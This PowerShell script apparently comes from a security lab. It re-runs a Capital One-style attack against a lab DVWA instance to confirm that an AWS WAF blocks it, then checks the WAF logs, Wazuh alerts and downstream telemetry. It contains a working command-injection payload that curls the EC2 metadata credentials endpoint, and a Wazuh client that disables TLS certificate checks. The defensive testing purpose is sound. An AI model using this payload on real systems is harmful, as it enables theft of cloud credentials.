#requires -Version 7.4
[CmdletBinding()]
param(
    [string]$ReattackId = '',
    [string]$EvidenceRoot = '',
    [string]$StateRoot = '',
    [string]$SecretRoot = '',
    [string]$EarlyRuleId = '100110',
    [string]$ConfirmedRuleId = '100111',
    [string]$WazuhAttemptField = '',
    [Parameter(Mandatory)][string]$ExpectedWafTerminatingRuleId,
    [ValidateRange(60,600)][int]$ObservationSeconds = 120,
    [ValidateRange(10,60)][int]$RequestTimeoutSeconds = 30,
    [ValidateRange(1,20)][int]$ObservationPollSeconds = 5,
    [scriptblock]$DownstreamEvidenceProvider,
    [scriptblock]$HealthEvidenceProvider,
    [string]$ConfirmRun = ''
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

<##
CAPITAL-ONE WAF reattack contract

This is a PowerShell 7.4+ runner for the post-remediation check only.  It
resolves the active Daily Runtime application_url, logs in to a fresh DVWA
session, obtains the current CSRF token even when security=impossible, and
posts the same fixed IMDS role-discovery command used by the baseline.  The
command is never printed or persisted.

HTTP 403 is only an expected transport result.  PASS additionally requires a
CloudWatch WAF event with action=BLOCK, a non-empty terminating rule equal to
the explicitly supplied human-approved rule, and the same CloudFront request
ID observed in the response.  A missing edge ID, missing WAF event, ambiguous
match, or unknown terminating rule is a fail-closed runtime gap.

The early Wazuh zero-alert query requires the caller to provide the indexed
v2 attempt-correlation field explicitly.  The confirmed Rule has no DVWA
take_id, so it is checked across the bounded reattack window instead.  The
DownstreamEvidenceProvider and HealthEvidenceProvider are also explicit
read-only contracts because this repository has no single common live query
interface for ALB, DVWA, Push, CloudTrail, automatic-response, and Push Health
state.  Without those providers the runner refuses to send the attack and
reports the exact missing interface instead of claiming a WAF result.

DownstreamEvidenceProvider receives one context object and must return only:
  alb_new_attack_requests, dvwa_new_command_execution,
  push_new_attack_events, cloudtrail_new_protected_getobject,
  additional_automatic_response_count
as non-negative integers.  HealthEvidenceProvider receives the same context
and must return health_event_observed=$true and pipeline_healthy=$true.
Providers must perform bounded, read-only queries and must not return raw log,
request, cookie, token, credential, account, bucket, IP, or response values.
##>

$terraformRoot = (Resolve-Path (Join-Path $PSScriptRoot '..\..')).Path
$moduleRoot = Join-Path $terraformRoot 'automation'
Import-Module (Join-Path $moduleRoot 'SocLab.Security.psm1') -Force
. (Join-Path $terraformRoot 'daily-session-common.ps1')

$expectedAccountId = '433048100798'
$expectedPrimaryRegion = 'ap-northeast-2'
$globalWafRegion = 'us-east-1'
$reattackIdPattern = '^capital-one-reattack-[0-9]{8}T[0-9]{6}Z-[a-f0-9]{8}$'
$ruleIdPattern = '^[0-9]{3,12}$'
$wazuhFieldPattern = '^[A-Za-z0-9_.-]{1,120}$'
$wafRulePattern = '^[A-Za-z0-9._:-]{1,128}$'
$edgeRequestIdPattern = '^[A-Za-z0-9._:/=-]{1,256}$'

function Invoke-ReattackNativeJson {
    param(
        [Parameter(Mandatory)][string]$FilePath,
        [Parameter(Mandatory)][string[]]$ArgumentList,
        [Parameter(Mandatory)][string]$FailureMessage
    )

    $previousPreference = $ErrorActionPreference
    try {
        $ErrorActionPreference = 'Continue'
        $output = @(& $FilePath @ArgumentList 2>$null)
        $exitCode = $LASTEXITCODE
    } finally {
        $ErrorActionPreference = $previousPreference
    }
    if ($exitCode -ne 0) {
        throw $FailureMessage
    }
    $text = (($output | ForEach-Object { [string]$_ }) -join '').Trim()
    if (-not $text) {
        throw $FailureMessage
    }
    try {
        return $text | ConvertFrom-Json -Depth 100
    } catch {
        throw $FailureMessage
    }
}

function Invoke-ReattackNativeText {
    param(
        [Parameter(Mandatory)][string]$FilePath,
        [Parameter(Mandatory)][string[]]$ArgumentList,
        [Parameter(Mandatory)][string]$FailureMessage
    )

    $previousPreference = $ErrorActionPreference
    try {
        $ErrorActionPreference = 'Continue'
        $output = @(& $FilePath @ArgumentList 2>$null)
        $exitCode = $LASTEXITCODE
    } finally {
        $ErrorActionPreference = $previousPreference
    }
    if ($exitCode -ne 0) {
        throw $FailureMessage
    }
    $text = (($output | ForEach-Object { [string]$_ }) -join '').Trim()
    if (-not $text) {
        throw $FailureMessage
    }
    return $text
}

function ConvertFrom-ReattackQueryRows {
    param([AllowNull()][object]$Rows)

    return @($Rows | ForEach-Object {
        $row = [ordered]@{}
        foreach ($cell in @($_)) {
            if ($null -eq $cell -or
                $cell.PSObject.Properties.Name -notcontains 'field') {
                continue
            }
            $field = [string]$cell.field
            if (-not $field) {
                continue
            }
            $row[$field] = if ($cell.PSObject.Properties.Name -contains 'value') {
                [string]$cell.value
            } else {
                ''
            }
        }
        [pscustomobject]$row
    })
}

function Invoke-ReattackWafQuery {
    param(
        [Parameter(Mandatory)][string]$LogGroupName,
        [Parameter(Mandatory)][string]$RequestId,
        [Parameter(Mandatory)][datetimeoffset]$StartUtc,
        [Parameter(Mandatory)][datetimeoffset]$EndUtc
    )

    if ($RequestId -notmatch $edgeRequestIdPattern) {
        throw 'The CloudFront response did not provide a safe request correlation ID.'
    }
    $queryText = @"
fields @timestamp as event_time,
       action,
       terminatingRuleId as terminating_rule_id,
       terminatingRuleType as terminating_rule_type,
       httpRequest.httpMethod as method,
       httpRequest.uri as route,
       httpRequest.requestId as request_id
| filter action = "BLOCK"
    and httpRequest.httpMethod = "POST"
    and httpRequest.uri = "/vulnerabilities/exec/"
    and httpRequest.requestId = "$RequestId"
| sort @timestamp asc
| limit 10
"@
    $tempPath = Join-Path ([IO.Path]::GetTempPath()) (
        'capital-one-waf-reattack-' + [guid]::NewGuid().ToString('N') + '.cwli'
    )
    try {
        [IO.File]::WriteAllText($tempPath, $queryText, [Text.UTF8Encoding]::new($false))
        $queryFile = 'file://' + ($tempPath -replace '\\','/')
        $start = Invoke-ReattackNativeJson -FilePath 'aws' -ArgumentList @(
            'logs','start-query','--query-language','CWLI',
            '--log-group-name',$LogGroupName,
            '--start-time',$StartUtc.ToUnixTimeSeconds().ToString(),
            '--end-time',$EndUtc.ToUnixTimeSeconds().ToString(),
            '--query-string',$queryFile,'--limit','10',
            '--profile','terra-user','--region',$globalWafRegion,
            '--output','json','--no-cli-pager'
        ) -FailureMessage 'The WAF correlation query could not be started.'
        $queryId = [string]$start.queryId
        if ($queryId -notmatch '^[A-Za-z0-9-]{1,256}$') {
            throw 'The WAF correlation query returned an unsafe query identifier.'
        }
        $deadline = [datetimeoffset]::UtcNow.AddSeconds(60)
        $response = $null
        do {
            $response = Invoke-ReattackNativeJson -FilePath 'aws' -ArgumentList @(
                'logs','get-query-results','--query-id',$queryId,
                '--profile','terra-user','--region',$globalWafRegion,
                '--output','json','--no-cli-pager'
            ) -FailureMessage 'The WAF correlation query could not be read.'
            if ([string]$response.status -ceq 'Complete') {
                break
            }
            if ([string]$response.status -notin @('Scheduled','Running')) {
                throw 'The WAF correlation query ended in an unsupported state.'
            }
            Start-Sleep -Seconds 2
        } while ([datetimeoffset]::UtcNow -lt $deadline)
        if ($null -eq $response -or [string]$response.status -cne 'Complete') {
            throw 'The WAF correlation query exceeded its bounded polling window.'
        }
        return @(ConvertFrom-ReattackQueryRows -Rows $response.results)
    } finally {
        Remove-Item -LiteralPath $tempPath -Force -ErrorAction SilentlyContinue
    }
}

function Invoke-ReattackWazuhSearch {
    param(
        [Parameter(Mandatory)][hashtable]$Query,
        [Parameter(Mandatory)][string]$AdminPassword
    )

    if ([string]::IsNullOrWhiteSpace($AdminPassword)) {
        throw 'The Wazuh indexer password is unavailable.'
    }
    $uri = [uri]'https://127.0.0.1:9200/wazuh-alerts-4.x-*/_search'
    $handler = [Net.Http.HttpClientHandler]::new()
    $handler.AllowAutoRedirect = $false
    $handler.ServerCertificateCustomValidationCallback = { $true }
    $client = [Net.Http.HttpClient]::new($handler)
    $client.Timeout = [timespan]::FromSeconds(20)
    $request = [Net.Http.HttpRequestMessage]::new([Net.Http.HttpMethod]::Post,$uri)
    $authBytes = [Text.Encoding]::UTF8.GetBytes("admin:$AdminPassword")
    try {
        $request.Headers.Authorization = [Net.Http.Headers.AuthenticationHeaderValue]::new(
            'Basic',[Convert]::ToBase64String($authBytes)
        )
        $request.Content = [Net.Http.StringContent]::new(
            ($Query | ConvertTo-Json -Depth 30 -Compress),
            [Text.Encoding]::UTF8,'application/json'
        )
        $response = $client.SendAsync($request).GetAwaiter().GetResult()
        try {
            if ([int]$response.StatusCode -ne 200) {
                throw 'The Wazuh indexer rejected the bounded query.'
            }
            $text = $response.Content.ReadAsStringAsync().GetAwaiter().GetResult()
            if ($text.Length -gt 8388608) {
                throw 'The Wazuh indexer response exceeded the bounded size.'
            }
            return $text | ConvertFrom-Json -Depth 100
        } finally {
            $response.Dispose()
        }
    } catch {
        throw 'The Wazuh indexer search failed.'
    } finally {
        [Array]::Clear($authBytes,0,$authBytes.Length)
        if ($request.Content) { $request.Content.Dispose() }
        $request.Dispose()
        $client.Dispose()
        $handler.Dispose()
    }
}

function Get-ReattackWazuhRuleCount {
    param(
        [Parameter(Mandatory)][string]$RuleId,
        [string]$AttemptField = '',
        [string]$AttemptId = '',
        [Parameter(Mandatory)][string]$AdminPassword,
        [Parameter(Mandatory)][datetimeoffset]$StartUtc,
        [Parameter(Mandatory)][datetimeoffset]$EndUtc
    )

    if ([string]::IsNullOrWhiteSpace($AttemptField) -ne
        [string]::IsNullOrWhiteSpace($AttemptId)) {
        throw 'Wazuh attempt field and identifier must be supplied together.'
    }
    $filters = @(
        @{term=@{'rule.id'=$RuleId}}
    )
    if ($AttemptField) {
        $filters += @{term=@{$AttemptField=$AttemptId}}
    }
    $filters += @{range=@{'@timestamp'=@{
        gte=$StartUtc.ToUniversalTime().ToString('o')
        lte=$EndUtc.ToUniversalTime().ToString('o')
    }}}
    $query = [ordered]@{
        size = 1
        track_total_hits = $true
        _source = @('rule.id','@timestamp')
        query = [ordered]@{
            bool = [ordered]@{
                filter = $filters
            }
        }
    }
    $result = Invoke-ReattackWazuhSearch -Query $query -AdminPassword $AdminPassword
    $total = $result.hits.total
    if ($total -is [int] -or $total -is [long] -or $total -is [decimal]) {
        return [int64]$total
    }
    if ($null -ne $total -and $total.PSObject.Properties.Name -contains 'value') {
        return [int64]$total.value
    }
    return [int64]@($result.hits.hits).Count
}

function Get-ReattackHeaderValue {
    param(
        [Parameter(Mandatory)][AllowNull()][object]$Response,
        [Parameter(Mandatory)][string]$Name
    )

    if ($null -eq $Response) { return '' }
    try {
        if ($Response.Headers -and $Response.Headers[$Name]) {
            return ([string]$Response.Headers[$Name]).Trim()
        }
        if ($Response.Headers -and $Response.Headers.Contains($Name)) {
            return ([string](@($Response.Headers.GetValues($Name))[0])).Trim()
        }
    } catch {}
    return ''
}

function Get-ReattackCsrfToken {
    param([Parameter(Mandatory)][string]$Html)

    $match = [regex]::Match(
        $Html,
        'name\s*=\s*["'']user_token["''][^>]*value\s*=\s*["'']([^"'']+)["'']',
        [Text.RegularExpressions.RegexOptions]::IgnoreCase
    )
    if (-not $match.Success) {
        throw 'The required DVWA CSRF token was not found.'
    }
    return $match.Groups[1].Value
}

function Assert-ReattackProviderCount {
    param(
        [Parameter(Mandatory)][object]$Record,
        [Parameter(Mandatory)][string]$PropertyName
    )

    $value = $null
    $present = $false
    if ($Record -is [Collections.IDictionary] -and $Record.Contains($PropertyName)) {
        $value = $Record[$PropertyName]
        $present = $true
    } else {
        $property = $Record.PSObject.Properties[$PropertyName]
        if ($null -ne $property) {
            $value = $property.Value
            $present = $true
        }
    }
    if (-not $present) {
        throw "The read-only observation provider omitted $PropertyName."
    }
    $normalized = [string]$value
    $parsed = 0L
    if ($normalized -notmatch '^(0|[1-9][0-9]*)$' -or
        -not [int64]::TryParse($normalized,[ref]$parsed)) {
        throw "The read-only observation provider returned a non-integer $PropertyName."
    }
    return $parsed
}

function Assert-ReattackProviderBoolean {
    param(
        [Parameter(Mandatory)][object]$Record,
        [Parameter(Mandatory)][string]$PropertyName
    )

    $value = $null
    $present = $false
    if ($Record -is [Collections.IDictionary] -and $Record.Contains($PropertyName)) {
        $value = $Record[$PropertyName]
        $present = $true
    } else {
        $property = $Record.PSObject.Properties[$PropertyName]
        if ($null -ne $property) {
            $value = $property.Value
            $present = $true
        }
    }
    if (-not $present -or $value -isnot [bool]) {
        throw "The read-only observation provider returned a non-Boolean $PropertyName."
    }
    return [bool]$value
}

if ($ReattackId -eq '') {
    $seed = New-SocTakeId
    $ReattackId = 'capital-one-reattack-' + $seed.Substring('capital-one-'.Length)
}
if ($ReattackId -notmatch $reattackIdPattern) {
    throw 'ReattackId must use the fixed capital-one-reattack-yyyyMMddTHHmmssZ-xxxxxxxx format.'
}
$ControlTakeId = New-SocTakeId
foreach ($ruleValue in @($EarlyRuleId,$ConfirmedRuleId)) {
    if ($ruleValue -notmatch $ruleIdPattern) {
        throw 'EarlyRuleId and ConfirmedRuleId must be numeric Rule IDs supplied by explicit contract.'
    }
}
if ($ExpectedWafTerminatingRuleId -notmatch $wafRulePattern) {
    throw 'ExpectedWafTerminatingRuleId is unsafe or missing.'
}
if ($WazuhAttemptField -and $WazuhAttemptField -notmatch $wazuhFieldPattern) {
    throw 'WazuhAttemptField is unsafe.'
}
if (-not $EvidenceRoot) {
    $EvidenceRoot = Join-Path ([Environment]::GetFolderPath('MyDocuments')) 'aws-topology-evidence'
}
$EvidenceRoot = [IO.Path]::GetFullPath($EvidenceRoot)

foreach ($command in @('terraform','aws')) {
    if (-not (Get-Command $command -ErrorAction SilentlyContinue)) {
        throw "Required command is unavailable: $command"
    }
}

$dailyStatePath = Get-DailySessionActiveStatePath -StateRoot $StateRoot
$dailyState = Read-DailySessionState -Path $dailyStatePath
if ([string]$dailyState.Status -cne 'Active' -or
    [string]$dailyState.SecurityScenarioProfile -cne 'capital-one-lab' -or
    [string]$dailyState.AccountId -cne $expectedAccountId -or
    [string]$dailyState.PrimaryRegion -cne $expectedPrimaryRegion -or
    [IO.Path]::GetFullPath([string]$dailyState.TerraformRoot) -cne
        [IO.Path]::GetFullPath($terraformRoot)) {
    throw 'The active Daily Runtime does not match the fixed Capital One lab boundary.'
}
$runtimeRemaining = [datetimeoffset]::Parse([string]$dailyState.HardDeadlineAtUtc) -
    [datetimeoffset]::UtcNow
if ($runtimeRemaining.TotalSeconds -lt ($ObservationSeconds + 120)) {
    throw 'The active Daily Runtime cannot cover the bounded reattack observation.'
}

$runtimeProfile = Invoke-ReattackNativeText -FilePath 'terraform' -ArgumentList @(
    "-chdir=$terraformRoot",'output','-raw','runtime_profile'
) -FailureMessage 'The active Runtime profile is unavailable.'
$securityProfile = Invoke-ReattackNativeText -FilePath 'terraform' -ArgumentList @(
    "-chdir=$terraformRoot",'output','-raw','security_scenario_profile'
) -FailureMessage 'The active security scenario profile is unavailable.'
$applicationUrl = [uri](Invoke-ReattackNativeText -FilePath 'terraform' -ArgumentList @(
    "-chdir=$terraformRoot",'output','-raw','application_url'
) -FailureMessage 'The active application_url is unavailable.')
if ($runtimeProfile -cne 'minimal' -or $securityProfile -cne 'capital-one-lab' -or
    $applicationUrl.Scheme -cne 'https' -or -not $applicationUrl.Host) {
    throw 'The active Runtime does not match the fixed HTTPS Capital One target.'
}

$foundationRoot = Join-Path $terraformRoot 'foundation'
$logGroups = Invoke-ReattackNativeJson -FilePath 'terraform' -ArgumentList @(
    "-chdir=$foundationRoot",'output','-json','security_log_group_names'
) -FailureMessage 'The Foundation WAF log-group output is unavailable.'
$wafLogGroup = [string]$logGroups.waf
if ($wafLogGroup -notmatch '^aws-waf-logs-[A-Za-z0-9._-]{1,200}$') {
    throw 'The active WAF log group is outside the fixed Foundation boundary.'
}

$loginUri = [uri]::new($applicationUrl,'/login.php')
$execUri = [uri]::new($applicationUrl,'/vulnerabilities/exec/')
$homeUri = [uri]::new($applicationUrl,'/index.php')
$session = [Microsoft.PowerShell.Commands.WebRequestSession]::new()
$session.UserAgent = 'aws-topology-capital-one-waf-reattack/1.0'

Write-Host 'Capital One WAF reattack preview'
Write-Host "REATTACK_ID=$ReattackId"
Write-Host "Runtime: $runtimeProfile + $securityProfile"
Write-Host 'Target: active HTTPS application_url -> /vulnerabilities/exec/'
Write-Host 'Attack: same IMDS role-discovery POST, including the current impossible-session CSRF token'
Write-Host "Expected WAF terminating Rule: $ExpectedWafTerminatingRuleId"
Write-Host "Early Rule contract: $EarlyRuleId; confirmed Rule contract: $ConfirmedRuleId"
Write-Host "Observation window: $ObservationSeconds seconds"
Write-Host 'Cookie, CSRF token, command response, credential, account, bucket, IP, and payload are not printed or persisted.'
Write-Host "NORMAL_CONTROL_TAKE_ID=$ControlTakeId"
if (-not $WazuhAttemptField) {
    Write-Host 'Runtime gap: WazuhAttemptField is not supplied; the v2 alert field contract is intentionally not inferred.'
}
if (-not $DownstreamEvidenceProvider) {
    Write-Host 'Runtime gap: a read-only downstream evidence provider is required for ALB/DVWA/Push/CloudTrail/response zero checks.'
}
if (-not $HealthEvidenceProvider) {
    Write-Host 'Runtime gap: a read-only Push Health evidence provider is required to distinguish WAF blocking from telemetry failure.'
}
if ($ConfirmRun -cne 'RUN CAPITAL ONE WAF REATTACK') {
    throw "Preview only. Re-run with -ConfirmRun 'RUN CAPITAL ONE WAF REATTACK' after the read-only adapters and static tests pass."
}
if (-not $WazuhAttemptField -or -not $DownstreamEvidenceProvider -or -not $HealthEvidenceProvider) {
    throw 'Runtime gap: explicit Wazuh attempt field, downstream provider, and Health provider are required before attack execution.'
}

$startedAt = [datetimeoffset]::UtcNow
$finishedAt = $null
$failureStage = 'preflight'
$failureType = ''
$httpStatus = 0
$edgeRequestIdObserved = $false
$wafAction = ''
$wafTerminatingRuleId = ''
$wafTerminatingRuleType = ''
$wafCorrelation = ''
$securityLevel = ''
$csrfTokenObtained = $false
$samePayloadPosted = $false
$normalLogin = $false
$normalHome = $false
$normalPing = $false
$earlyRuleCount = 0L
$confirmedRuleCount = 0L
$downstream = $null
$health = $null
$adminPassword = $null
$wafRows = @()

try {
    $failureStage = 'login-and-impossible-session'
    $loginPage = Invoke-WebRequest -Uri $loginUri -Method Get -WebSession $session `
        -UseBasicParsing -TimeoutSec $RequestTimeoutSeconds -ErrorAction Stop
    $loginToken = Get-ReattackCsrfToken -Html ([string]$loginPage.Content)
    $loginPage = $null
    $loginResult = Invoke-WebRequest -Uri $loginUri -Method Post -WebSession $session `
        -UseBasicParsing -TimeoutSec $RequestTimeoutSeconds -ErrorAction Stop -Body @{
            username='admin'; password='password'; Login='Login'; user_token=$loginToken
        }
    $normalLogin = [int]$loginResult.StatusCode -eq 200
    $loginToken = $null
    $loginResult = $null
    if (-not $normalLogin) { throw 'The fixed DVWA login control did not return HTTP 200.' }

    $execPage = Invoke-WebRequest -Uri $execUri -Method Get -WebSession $session `
        -UseBasicParsing -TimeoutSec $RequestTimeoutSeconds -ErrorAction Stop
    $securityCookie = @($session.Cookies.GetCookies($applicationUrl) |
        Where-Object { $_.Name -ceq 'security' }) | Select-Object -Last 1
    if ($null -eq $securityCookie) { throw 'The DVWA security cookie was not returned.' }
    $securityLevel = [string]$securityCookie.Value
    if ($securityLevel -cne 'impossible') {
        throw 'The reattack requires a fresh DVWA impossible session.'
    }
    $execToken = Get-ReattackCsrfToken -Html ([string]$execPage.Content)
    $execPage = $null
    $csrfTokenObtained = $true

    $failureStage = 'same-payload-reattack'
    $roleStart = '__CAPITAL_ROLE_BEGIN__'
    $roleEnd = '__CAPITAL_ROLE_END__'
    $rolePayload = (
        "127.0.0.1; printf '\n$roleStart\n'; " +
        'curl -s --max-time 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/; ' +
        "printf '\n$roleEnd\n'"
    )
    $attackResponse = $null
    try {
        $attackResponse = Invoke-WebRequest -Uri $execUri -Method Post -WebSession $session `
            -UseBasicParsing -TimeoutSec $RequestTimeoutSeconds -ErrorAction Stop `
            -Headers @{'X-SOC-TAKE-ID'=$ReattackId} `
            -Body @{ip=$rolePayload;Submit='Submit';user_token=$execToken}
        $httpStatus = [int]$attackResponse.StatusCode
        $edgeRequestId = Get-ReattackHeaderValue -Response $attackResponse -Name 'X-Amz-Cf-Id'
    } catch {
        $response = $_.Exception.Response
        if ($null -eq $response) { throw 'The same-payload POST did not return an HTTP response.' }
        $httpStatus = [int]$response.StatusCode
        $edgeRequestId = Get-ReattackHeaderValue -Response $response -Name 'X-Amz-Cf-Id'
    } finally {
        $attackResponse = $null
        $rolePayload = $null
        $execToken = $null
    }
    if ($httpStatus -ne 403) {
        throw 'The same-payload request did not terminate with the expected HTTP 403.'
    }
    if ($edgeRequestId -notmatch $edgeRequestIdPattern) {
        throw 'The HTTP 403 response did not expose a safe CloudFront request ID for WAF correlation.'
    }
    $edgeRequestIdObserved = $true
    $samePayloadPosted = $true

    $failureStage = 'waf-correlation'
    $observationDeadline = $startedAt.AddSeconds($ObservationSeconds)
    do {
        $wafRows = @(Invoke-ReattackWafQuery -LogGroupName $wafLogGroup `
            -RequestId $edgeRequestId -StartUtc $startedAt -EndUtc ([datetimeoffset]::UtcNow))
        if ($wafRows.Count -gt 1) {
            throw 'The WAF correlation returned more than one event for the same request ID.'
        }
        if ($wafRows.Count -eq 1) { break }
        if ([datetimeoffset]::UtcNow -lt $observationDeadline) {
            Start-Sleep -Seconds $ObservationPollSeconds
        }
    } while ([datetimeoffset]::UtcNow -lt $observationDeadline)
    if ($wafRows.Count -ne 1) {
        throw 'The WAF BLOCK event for the same CloudFront request was not observed within the bounded window.'
    }
    $wafEvent = $wafRows[0]
    $wafAction = [string]$wafEvent.action
    $wafTerminatingRuleId = [string]$wafEvent.terminating_rule_id
    $wafTerminatingRuleType = [string]$wafEvent.terminating_rule_type
    $wafRequestId = [string]$wafEvent.request_id
    if ($wafAction -cne 'BLOCK' -or
        $wafTerminatingRuleId -cne $ExpectedWafTerminatingRuleId -or
        [string]::IsNullOrWhiteSpace($wafTerminatingRuleType) -or
        $wafRequestId -cne $edgeRequestId) {
        throw 'The WAF event did not satisfy action, terminating-rule, and same-request correlation.'
    }
    $wafCorrelation = 'CloudFront X-Amz-Cf-Id = WAF httpRequest.requestId'

    $failureStage = 'normal-controls'
    $home = Invoke-WebRequest -Uri $homeUri -Method Get -WebSession $session `
        -UseBasicParsing -TimeoutSec $RequestTimeoutSeconds -ErrorAction Stop
    $normalHome = [int]$home.StatusCode -eq 200 -and
        [string]$home.Content -match 'Damn Vulnerable Web Application'
    $home = $null
    $freshExecPage = Invoke-WebRequest -Uri $execUri -Method Get -WebSession $session `
        -UseBasicParsing -TimeoutSec $RequestTimeoutSeconds -ErrorAction Stop
    $freshExecToken = Get-ReattackCsrfToken -Html ([string]$freshExecPage.Content)
    $freshExecPage = $null
    $ping = Invoke-WebRequest -Uri $execUri -Method Post -WebSession $session `
        -UseBasicParsing -TimeoutSec $RequestTimeoutSeconds -ErrorAction Stop `
        -Headers @{'X-SOC-TAKE-ID'=$ControlTakeId} `
        -Body @{ip='127.0.0.1';Submit='Submit';user_token=$freshExecToken}
    $pingText = [Net.WebUtility]::HtmlDecode([string]$ping.Content)
    $normalPing = [int]$ping.StatusCode -eq 200 -and
        $pingText -notmatch 'ERROR:\s*You have entered an invalid IP' -and
        $pingText -match '127\.0\.0\.1'
    $freshExecToken = $null
    $pingText = $null
    $ping = $null
    if (-not $normalHome -or -not $normalPing) {
        throw 'A normal home or numeric-IP Ping control failed after WAF blocking.'
    }

    $failureStage = 'wazuh-zero-observation'
    $adminPassword = Unprotect-SocSecret -Name 'wazuh_indexer_admin_password' -SecretRoot $SecretRoot
    do {
        $zeroObservationEnd = [datetimeoffset]::UtcNow
        $earlyRuleCount = Get-ReattackWazuhRuleCount -RuleId $EarlyRuleId `
            -AttemptField $WazuhAttemptField -AttemptId $ReattackId -AdminPassword $adminPassword `
            -StartUtc $startedAt -EndUtc $zeroObservationEnd
        $confirmedRuleCount = Get-ReattackWazuhRuleCount -RuleId $ConfirmedRuleId `
            -AdminPassword $adminPassword `
            -StartUtc $startedAt -EndUtc $zeroObservationEnd
        if ($earlyRuleCount -ne 0 -or $confirmedRuleCount -ne 0) {
            throw 'The reattack produced a new v2 Wazuh alert.'
        }
        if ($zeroObservationEnd -lt $observationDeadline) {
            Start-Sleep -Seconds $ObservationPollSeconds
        }
    } while ($zeroObservationEnd -lt $observationDeadline)

    $failureStage = 'downstream-zero-observation'
    $providerContext = [pscustomobject][ordered]@{
        reattack_id = $ReattackId
        normal_control_take_id = $ControlTakeId
        started_at_utc = $startedAt.ToUniversalTime().ToString('o')
        observed_until_utc = $zeroObservationEnd.ToUniversalTime().ToString('o')
        http_status = $httpStatus
        waf_request_correlated = $true
    }
    try {
        $downstreamRecords = @(& $DownstreamEvidenceProvider $providerContext)
    } catch {
        throw 'The downstream evidence provider failed its bounded read-only contract.'
    }
    if ($downstreamRecords.Count -ne 1) {
        throw 'The downstream evidence provider must return exactly one sanitized record.'
    }
    $downstream = $downstreamRecords[0]
    foreach ($property in @(
        'alb_new_attack_requests','dvwa_new_command_execution','push_new_attack_events',
        'cloudtrail_new_protected_getobject','additional_automatic_response_count'
    )) {
        $count = Assert-ReattackProviderCount -Record $downstream -PropertyName $property
        if ($count -ne 0) { throw 'A downstream or automatic-response count was non-zero.' }
    }

    $failureStage = 'push-health-observation'
    try {
        $healthRecords = @(& $HealthEvidenceProvider $providerContext)
    } catch {
        throw 'The Push Health evidence provider failed its bounded read-only contract.'
    }
    if ($healthRecords.Count -ne 1) {
        throw 'The Push Health evidence provider must return exactly one sanitized record.'
    }
    $health = $healthRecords[0]
    $healthEventObserved = Assert-ReattackProviderBoolean -Record $health `
        -PropertyName 'health_event_observed'
    $pipelineHealthy = Assert-ReattackProviderBoolean -Record $health `
        -PropertyName 'pipeline_healthy'
    if (-not $healthEventObserved -or -not $pipelineHealthy) {
        throw 'The Push Health control did not prove a healthy telemetry path.'
    }
    $finishedAt = [datetimeoffset]::UtcNow
} catch {
    $failureType = $_.Exception.GetType().FullName
    if (-not $finishedAt) { $finishedAt = [datetimeoffset]::UtcNow }
} finally {
    $adminPassword = $null
    $securityCookie = $null
    $session = $null
}

$evidenceDirectory = Join-Path $EvidenceRoot (Join-Path $ReattackId 'source\client')
New-Item -ItemType Directory -Path $evidenceDirectory -Force | Out-Null
$recordPath = Join-Path $evidenceDirectory 'capital-one-waf-reattack.json'
$record = [ordered]@{
    schema_version = 1
    scenario_id = 'CAPITAL-ONE-WAF-REATTACK'
    reattack_id = $ReattackId
    normal_control_take_id = $ControlTakeId
    started_at_utc = $startedAt.ToUniversalTime().ToString('o')
    finished_at_utc = $finishedAt.ToUniversalTime().ToString('o')
    observation_seconds = $ObservationSeconds
    dvwa_security_level = $securityLevel
    csrf_token_obtained = $csrfTokenObtained
    same_role_discovery_payload_posted = $samePayloadPosted
    http_status = $httpStatus
    edge_request_id_observed = $edgeRequestIdObserved
    waf_action = $wafAction
    waf_terminating_rule_id = $wafTerminatingRuleId
    waf_terminating_rule_type = $wafTerminatingRuleType
    waf_request_correlation = $wafCorrelation
    downstream = if ($downstream) {
        [ordered]@{
            alb_new_attack_requests = [int64]$downstream.alb_new_attack_requests
            dvwa_new_command_execution = [int64]$downstream.dvwa_new_command_execution
            push_new_attack_events = [int64]$downstream.push_new_attack_events
            cloudtrail_new_protected_getobject = [int64]$downstream.cloudtrail_new_protected_getobject
            additional_automatic_response_count = [int64]$downstream.additional_automatic_response_count
        }
    } else { $null }
    early_rule_id = $EarlyRuleId
    early_rule_alert_count = $earlyRuleCount
    confirmed_rule_id = $ConfirmedRuleId
    confirmed_rule_alert_count = $confirmedRuleCount
    normal_login = $normalLogin
    normal_home = $normalHome
    normal_numeric_ip_ping = $normalPing
    push_health = if ($health) {
        [ordered]@{
            health_event_observed = $healthEventObserved
            pipeline_healthy = $pipelineHealthy
        }
    } else { $null }
    response_body_persisted = $false
    credential_value_observed = $false
    cookie_persisted = $false
    failure_stage = if ($failureType) { $failureStage } else { '' }
    failure_type = $failureType
    runtime_gap = if (-not $WazuhAttemptField) {
        'WazuhAttemptField is not defined by the current v2 interface.'
    } elseif (-not $DownstreamEvidenceProvider) {
        'No bounded read-only downstream evidence provider is available.'
    } elseif (-not $HealthEvidenceProvider) {
        'No bounded read-only Push Health evidence provider is available.'
    } else { '' }
}
[IO.File]::WriteAllText(
    $recordPath,
    (($record | ConvertTo-Json -Depth 12) + "`n"),
    [Text.UTF8Encoding]::new($false)
)

if ($failureType) {
    throw "Capital One WAF reattack failed at '$failureStage'. See sanitized Evidence."
}
if ($record.runtime_gap) {
    throw 'Capital One WAF reattack is incomplete because an explicit runtime interface is unavailable.'
}
Write-Host 'CAPITAL_ONE_WAF_REATTACK_BLOCKED=yes'
Write-Host 'CAPITAL_ONE_WAF_ACTION=BLOCK'
Write-Host 'CAPITAL_ONE_WAF_HTTP_STATUS=403'
Write-Host 'CAPITAL_ONE_DOWNSTREAM_ZERO=yes'
Write-Host 'CAPITAL_ONE_NORMAL_FUNCTION=yes'
Write-Host 'CAPITAL_ONE_PUSH_HEALTH=yes'
Write-Host "WAF_REATTACK_EVIDENCE=$recordPath"
